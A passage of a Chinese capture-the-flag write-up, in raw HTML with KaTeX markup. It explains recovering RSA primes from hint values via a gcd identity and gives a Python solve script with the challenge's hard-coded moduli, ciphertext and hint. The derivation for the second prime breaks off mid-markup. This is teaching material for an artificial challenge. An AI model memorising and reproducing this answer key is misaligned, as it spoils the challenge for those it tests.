encoding="application/x-tex">a^{p-1} \mod{p}=1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8641em;"></span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8641em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">p</span><span class="mbin mtight">−</span><span class="mord mtight">1</span></span></span></span></span></span></span></span></span><span class="mspace allowbreak"></span><span class="mspace" style="margin-right:1em;"></span></span><span class="base"><span class="strut" style="height:0.8889em;vertical-align:-0.1944em;"></span><span class="mord"><span class="mord"><span class="mord mathrm">mod</span></span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal">p</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">1</span></span></span></span></span></p><p>所以</p><p><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mi>h</mi><mspace></mspace><mspace width="1em"/><mrow><mi mathvariant="normal">m</mi><mi mathvariant="normal">o</mi><mi mathvariant="normal">d</mi></mrow><mtext> </mtext><mtext> </mtext><mi>p</mi><mo>≡</mo><msup><mi>b</mi><mi>n</mi></msup><mspace></mspace><mspace width="1em"/><mrow><mi mathvariant="normal">m</mi><mi mathvariant="normal">o</mi><mi mathvariant="normal">d</mi></mrow><mtext> </mtext><mtext> </mtext><mi>p</mi><mspace linebreak="newline"></mspace><mi>h</mi><mo>+</mo><msub><mi>k</mi><mn>3</mn></msub><mi>p</mi><mo>=</mo><msup><mi>b</mi><mi>n</mi></msup><mspace linebreak="newline"></mspace><msub><mi>k</mi><mn>3</mn></msub><mi>p</mi><mo>=</mo><msup><mi>b</mi><mi>n</mi></msup><mo>−</mo><mi>h</mi></mrow><annotation encoding="application/x-tex">h \mod p \equiv b^n \mod{p} \\h+k_3p=b^n \\k_3p=b^n-h</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6944em;"></span><span class="mord mathnormal">h</span><span class="mspace allowbreak"></span><span class="mspace" style="margin-right:1em;"></span></span><span class="base"><span class="strut" style="height:0.8889em;vertical-align:-0.1944em;"></span><span class="mord"><span class="mord"><span class="mord mathrm">mod</span></span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal">p</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">≡</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.7144em;"></span><span class="mord"><span class="mord mathnormal">b</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.7144em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">n</span></span></span></span></span></span></span></span><span class="mspace allowbreak"></span><span class="mspace" style="margin-right:1em;"></span></span><span class="base"><span class="strut" style="height:0.8889em;vertical-align:-0.1944em;"></span><span class="mord"><span class="mord"><span class="mord mathrm">mod</span></span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal">p</span></span><span class="mspace newline"></span><span class="base"><span class="strut" style="height:0.7778em;vertical-align:-0.0833em;"></span><span class="mord mathnormal">h</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.8889em;vertical-align:-0.1944em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0315em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">3</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord mathnormal">p</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.7144em;"></span><span class="mord"><span class="mord mathnormal">b</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.7144em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">n</span></span></span></span></span></span></span></span></span><span class="mspace newline"></span><span class="base"><span class="strut" style="height:0.8889em;vertical-align:-0.1944em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0315em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">3</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord mathnormal">p</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.7977em;vertical-align:-0.0833em;"></span><span class="mord"><span class="mord mathnormal">b</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.7144em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">n</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.6944em;"></span><span class="mord mathnormal">h</span></span></span></span></span></p><p>综上，<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>p</mi><mo>=</mo><mi>g</mi><mi>c</mi><mi>d</mi><mo stretchy="false">(</mo><mo stretchy="false">(</mo><msup><mi>b</mi><mi>n</mi></msup><mo>−</mo><mi>h</mi><mo stretchy="false">)</mo><mo separator="true">,</mo><mi>n</mi><mo stretchy="false">)</mo><mo>=</mo><mi>g</mi><mi>c</mi><mi>d</mi><mo stretchy="false">(</mo><msup><mi>b</mi><mi>n</mi></msup><mtext> </mtext><mrow><mi mathvariant="normal">m</mi><mi mathvariant="normal">o</mi><mi mathvariant="normal">d</mi></mrow><mtext> </mtext><mi>n</mi><mo>−</mo><mi>h</mi><mo separator="true">,</mo><mi>n</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">p=gcd((b^n-h),n)=gcd(b^n \ \mathrm {mod} \ n-h,n)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.1944em;"></span><span class="mord mathnormal">p</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">g</span><span class="mord mathnormal">c</span><span class="mord mathnormal">d</span><span class="mopen">((</span><span class="mord"><span class="mord mathnormal">b</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.6644em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">n</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">h</span><span class="mclose">)</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal">n</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">g</span><span class="mord mathnormal">c</span><span class="mord mathnormal">d</span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal">b</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.6644em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">n</span></span></span></span></span></span></span></span><span class="mspace"> </span><span class="mord"><span class="mord mathrm">mod</span></span><span class="mspace"> </span><span class="mord mathnormal">n</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">h</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal">n</span><span class="mclose">)</span></span></span></span>（因为<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msup><mi>b</mi><mi>n</mi></msup></mrow><annotation encoding="application/x-tex">{b^n}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6944em;"></span><span class="mord"><span class="mord"><span class="mord mathnormal">b</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.6644em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">n</span></span></span></span></span></span></span></span></span></span></span></span>比较大，所以模n之后再进行计算，结果相同）</p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"></span><br><span class="line">n1 = <span class="number">0x11DF715605906C9CFC906FAF4D02A380B9489FE890952CFBC7713AF87031B61A4A3A0E2C46BA89EF462A3A77DEF7D5DE0A0A10B3D1303AFC06ED7BC9F07E01E9883B06CE17C290FE550844CF9028F50642E4190CCB13CDF0BB0493E437C54EE17643202CC1B35741208957EB6C1843299B4480E6D32A311DE6FD6F4B9D9E8FAB</span></span><br><span class="line">c1 = <span class="number">0x5A768E8E3E4EFE51F566D77DD9A1312F5398BC9E1FA4E828BE6A3B6AA6109DE02C4EEC524E23BF0836B7B25F534A429744E980BDC3ACD77A8133C543EA1CF4F4665FBD46BC21D38EDD60A687007E079980CAC97E1099610AECEEE3BFF13483396A4CFB061DF7D5BCE9C7FBA6AE14FBEAD5F56AA990F23EE9CBE8A8FC066D5FA</span></span><br><span class="line">hint1 = <span class="number">0xC3FD84BEEB2363D414848FDA5898976625BCBB9637982F83853A6C96E64C8EC94645409B7036E3B187ECF930E294FC448C4AC6BFA9945078300B1619BC98D13275770F562874C7FD389BA9EF4E05019633566E65BA95E5A30E29A45B79774C6AAED89AA43105508E868941C81861120F50FE182E33B80701E1714205759F380</span></span><br><span class="line">b = <span class="number">2024</span></span><br><span class="line">p1 = gmpy2.gcd(<span class="built_in">pow</span>(b, n1, n1) - hint1, n1)</span><br><span class="line">q1 = n1 // p1</span><br><span class="line"><span class="keyword">assert</span> p1 * q1 == n1</span><br><span class="line">phi1 = (p1 - <span class="number">1</span>) * (q1 - <span class="number">1</span>)</span><br><span class="line">e1 = <span class="number">39847</span></span><br><span class="line">d1 = inverse(e1, phi1)</span><br><span class="line">p = <span class="built_in">pow</span>(c1, d1, n1)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;p=&quot;</span>, p)</span><br><span class="line"><span class="keyword">assert</span> isPrime(p)</span><br></pre></td></tr></table></figure><p>最后是求<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>q</mi></mrow><annotation encoding="application/x-tex">{q}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.1944em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">q</span></span></span></span></span></p><p><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mi>h</mi><mn>2</mn><mo>=</mo><mo stretchy="false">(</mo><mn>2023</mn><mo>×</mo><mi>p</mi><mn>2</mn><mo>+</mo><mn>2024</mn><mo>×</mo><mi>q</mi><mn>2</mn><msup><mo stretchy="false">)</mo><mn>2323</mn></msup><mspace></mspace><mspace width="1em"/><mrow><mi mathvariant="normal">m</mi><mi mathvariant="normal">o</mi><mi mathvariant="normal">d</mi></mrow><mtext> </mtext><mtext> </mtext><mi>n</mi><mn>2</mn><mspace linebreak="newline"></mspace><mi>h</mi><mn>2</mn><mo>=</mo><mo stretchy="false">(</mo><mn>2023</mn><mo>×</mo><mi>p</mi><mn>2</mn><msup><mo stretchy="false">)</mo><mn>2323</mn></msup><mo>+</mo><mo stretchy="false">(</mo><mn>2024</mn><mo>×</mo><mi>q</mi><mn>2</mn><msup><mo stretchy="false">)</mo><mn>2323</mn></msup><mspace></mspace><mspace width="1em"/><mrow><mi mathvariant="normal">m</mi><mi mathvariant="normal">o</mi><mi mathvariant="normal">d</mi></mrow><mtext> </mtext><mtext> </mtext><mi>n</mi><mn>2</mn><mspace linebreak="newline"></mspace><mi>h</mi><mn>2</mn><mo>×</mo><msup><mn>2023</mn><mn>2323</mn></msup><mo>=</mo><mo stretchy="false">(</mo><mn>2023</mn><mo>×</mo><mn>2023</mn><mo>×</mo><mi>p</mi><mn>2</mn><msup><mo stretchy="false">)</mo><mn>2323</mn></msup><mo>+</mo><mo stretchy="false">(</mo><mn>2023</mn><mo>×</mo><mn>2024</mn><mo>×</mo><mi>q</mi><mn>2</mn><msup><mo stretchy="false">)</mo><mn>2323</mn></msup><mspace></mspace><mspace width="1em"/><mrow><mi mathvariant="normal">m</mi><mi mathvariant="normal">o</mi><mi mathvariant="normal">d</mi></mrow><mtext> </mtext><mtext> </mtext><mi>n</mi><mn>2</mn><mspace linebreak="newline"></mspace><mtext>式①</mtext><mo>:</mo><mo stretchy="false">(</mo><mi>h</mi><mn>2</mn><mo>×</mo><msup><mn>2023</mn><mn>2323</mn></msup><msup><mo stretchy="false">)</mo><mn>2424</mn></msup><mo>=</mo><mo stretchy="false">(</mo><mn>2023</mn><mo>×</mo><mn>2023</mn><mo>×</mo><mi>p</mi><mn>2</mn><msup><mo stretchy="false">)</mo><mrow><mn>2323</mn><mo>×</mo><mn>2424</mn></mrow></msup><mo>+</mo><mo stretchy="false">(</mo><mn>2023</mn><mo>×</mo><mn>2024</mn><mo>×</mo><mi>q</mi><mn>2</mn><msup><mo stretchy="false">)</mo><mrow><mn>2323</mn><mo>×</mo><mn>2424</mn></mrow></msup><mspace></mspace><mspace width="1em"/><mrow><mi mathvariant="normal">m</mi><mi mathvariant="normal">o</mi><mi mathvariant="normal">d</mi></mrow><mtext> </mtext><mtext> </mtext><mi>n</mi><mn>2</mn><mspace linebreak="newline"></mspace><mi>h</mi><mn>3</mn><mo>=</mo><mo stretchy="false">(</mo><mn>2024</mn><mo>×</mo><mi>p</mi><mn>2</mn><mo>+</mo><mn>2023</mn><mo>×</mo><mi>q</mi><mn>2</mn><msup><mo stretchy="false">)</mo><mn>2424</mn></msup><mspace></mspace><mspace width="1em"/><mrow><mi mathvariant="normal">m</mi><mi mathvariant="normal">o</mi><mi mathvariant="normal">d</mi></mrow><mtext> </mtext><mtext> </mtext><mi>n</mi><mn>2</mn><mspace linebreak="newline"></mspace><mi>h</mi><mn>3</mn><mo>=</mo><mo stretchy="false">(</mo><mn>2024</mn><mo>×</mo><mi>p</mi><mn>2</mn><msup><mo stretchy="false">)</mo><mn>2424</mn></msup><mo>+</mo><mo stretchy="false">(</mo><mn>2023</mn><mo>×</mo><mi>q</mi><mn>2</mn><msup><mo stretchy="false">)</mo><mn>2424</mn></msup><mspace></mspace><mspace width="1em"/><mrow><mi mathvariant="normal">m</mi><mi mathvariant="normal">o</mi><mi mathvariant="normal">d</mi></mrow><mtext> </mtext><mtext> </mtext><mi>n</mi><mn>2</mn><mspace linebreak="newline"></mspace><mi>h</mi><mn>3</mn><mo>×</mo><msup><mn>2024</mn><mn>2424</mn></msup><mo>=</mo><mo stretchy="false">(</mo><mn>2024</mn><mo>×</mo><mn>2024</mn><mo>×</mo><mi>p</mi><mn>2</mn><msup><mo stretchy="false">)</mo><mn>2424</mn></msup><mo>+</mo><mo stretchy="false">(</mo><mn>2023</mn><mo>×</mo><mn>2024</mn><mo>×</mo><mi>q</mi><mn>2</mn><msup><mo stretchy="false">)</mo><mn>2424</mn></msup><mspace></mspace><mspace width="1em"/><mrow><mi mathvariant="normal">m</mi><mi mathvariant="normal">o</mi><mi mathvariant="normal">d</mi></mrow><mtext> </mtext><mtext> </mtext><mi>n</mi><mn>2</mn><mspace linebreak="newline"></mspace><mtext>式②</mtext><mo>:</mo><mo stretchy="false">(</mo><mi>h</mi><mn>3</mn><mo>×</mo><msup><mn>2024</mn><mn>2424</mn></msup><msup><mo stretchy="false">)</mo><mn>2323</mn></msup><mo>=</mo><mo stretchy="false">(</mo><mn>2024</mn><mo>×</mo><mn>2024</mn><mo>×</mo><mi>p</mi><mn>2</mn><msup><mo stretchy="false">)</mo><mrow><mn>2323</mn><mo>×</mo><mn>2424</mn></mrow></msup><mo>+</mo><mo stretchy="false">(</mo><mn>2023</mn><mo>×</mo><mn>2024</mn><mo>×</mo><mi>q</mi><mn>2</mn><msup><mo stretchy="false">)</mo><mrow><mn>2323</mn><mo>×</mo><mn>2424</mn></mrow></msup><mspace></mspace><mspace width="1em"/><mrow><mi mathvariant="normal">m</mi><mi mathvariant="normal">o</mi><mi mathvariant="normal">d</mi></mrow><mtext> </mtext><mtext> </mtext><mi>n</mi><mn>2</mn><mspace linebreak="newline"></mspace><mtext>最后将式②</mtext><mo>−</mo><mtext>式①得</mtext><mo>:</mo><mspace linebreak="newline"></mspace><mo stretchy="false">(</mo><mi>h</mi><mn>3</mn><mo>×</mo><msup><mn>2024</mn><mn>2424</mn></msup><msup><mo stretchy="false">)</mo><mn>2323</mn></msup><mo>−</mo><mo stretchy="false">(</mo><mi>h</mi><mn>2</mn><mo>×</mo><msup><mn>2023</mn><mn>2323</mn></msup><msup><mo stretchy="false">)</mo><mn>2424</mn></msup><mo>=</mo><mi>k</mi><mo>×</mo><mi>p</mi><mn>2</mn><mspace></mspace><mspace width="1em"/><mrow><mi mathvariant="normal">m</mi><mi mathvariant="normal">o</mi><mi mathvariant="normal">d</mi></mrow><mtext> </mtext><mtext> </mtext><mi>n</mi><mn>2</mn></mrow><annotation encoding="application/x-tex">h2 = (2023 \times p2+2024 \times q2)^{2323}\mod{n2} \\h2 = (2023 \times p2)^{2323}+(2024 \times q2)^{2323}\mod{n2} \\h2 \times 2023^{2323} = (2023 \times 2023 \times p2)^{2323} + (2023 \times 2024 \times q2)^{2323} \mod {n2} \\式①: (h2 \times 2023^{2323})^{2424} = (2023 \times 2023 \times p2)^{2323 \times 2424} + (2023 \times 2024 \times q2)^{2323 \times 2424} \mod{n2} \\h3 = (2024 \times p2+2023 \times q2)^{2424}\mod{n2} \\h3 = (2024 \times p2)^{2424}+(2023 \times q2)^{2424}\mod{n2} \\h3 \times 2024^{2424} = (2024 \times 2024 \times p2)^{2424} + (2023 \times 2024 \times q2)^{2424} \mod {n2} \\式②: (h3 \times 2024^{2424})^{2323} = (2024 \times 2024 \times p2)^{2323 \times 2424} + (2023 \times 2024 \times q2)^{2323 \times 2424} \mod {n2} \\最后将式②-式①得: \\(h3 \times 2024^{2424})^{2323} - (h2 \times 2023^{2323})^{2424} = k \times p2 \mod{n2}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6944em;"></span><span class="mord mathnormal">h</span><span class="mord">2</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord">2023</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">×</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.8389em;vertical-align:-0.1944em;"></span><span class="mord mathnormal">p</span><span class="mord">2</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.7278em;vertical-align:-0.0833em;"></span><span class="mord">2024</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">×</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:1.1141em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">q</span><span class="mord">2</span><span class="mclose"><span class="mclose">)</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8641em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2323</span></span></span></span></span></span></span></span></span><span class="mspace allowbreak"></span><span class="mspace" style="margin-right:1em;"></span></span><span class="base"><span class="strut" style="height:0.6944em;"></span><span class="mord"><span class="mord"><span class="mord mathrm">mod</span></span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal">n</span><span class="mord">2</span></span><span class="mspace newline"></span><span class="base"><span class="strut" style="height:0.6944em;"></span><span class="mord mathnormal">h</span><span class="mord">2</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord">2023</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">×</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:1.1141em;vertical-align:-0.25em;"></span><span class="mord mathnormal">p</span><span class="mord">2</span><span class="mclose"><span class="mclose">)</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8641em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2323</span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord">2024</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">×</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:1.1141em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">q</span><span class="mord">2</span><span class="mclose"><span class="mclose">)</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8641em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2323</span></span></span></span></span></span></span></span></span><span class="mspace allowbreak"></span><span class="mspace" style="margin-right:1em;"></span></span><span class="base"><span class="strut" style="height:0.6944em;"></span><span class="mord"><span class="mord"><span class="mord mathrm">mod</span></span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal">n</span><span class="mord">2</span></span><span class="mspace newline"></span><span class="base"><span class="strut" style="height:0.7778em;vertical-align:-0.0833em;"></span><span class="mord mathnormal">h</span><span class="mord">2</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">×</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.8641em;"></span><span class="mord">202</span><span class="mord"><span class="mord">3</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8641em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2323</span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord">2023</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">×</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.7278em;vertical-align:-0.0833em;"></span><span class="mord">2023</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">×</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:1.1141em;vertical-align:-0.25em;"></span><span class="mord mathnormal">p</span><span class="mord">2</span><span class="mclose"><span class="mclose">)</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8641em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2323</span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord">2023</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">×</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.7278em;vertical-align:-0.0833em;"></span><span class="mord">2024</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">×</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:1.1141em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">q</span><span class="mord">2</span><span class="mclose"><span class="mclose">)</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8641em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2323</span></span></span></span></span></span></span></span></span><span class="mspace allowbreak"></span><span class="mspace" style="margin-right:1em;"></span></span><span class="base"><span class="strut" style="height:0.6944em;"></span><span class="mord"><span class="mord"><span class="mord mathrm">mod</span></span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal">n</span><span class="mord">2</span></span><span class="mspace newline"></span><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord cjk_fallback">式</span><span class="mord">①</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">:</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord mathnormal">h</span><span class="mord">2</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">×</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:1.1141em;vertical-align:-0.25em;"></span><span class="mord">202</span><span class="mord"><span class="mord">3</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8641em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2323</span></span></span></span></span></span></span></span></span><span class="mclose"><span class="mclose">)</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8641em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2424</span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord">2023</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">×</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.7278em;vertical-align:-0.0833em;"></span><span class="mord">2023</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">×</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:1.1141em;vertical-align:-0.25em;"></span><span class="mord mathnormal">p</span><span class="mord">2</span><span class="mclose"><span class="mclose">)</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8641em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord 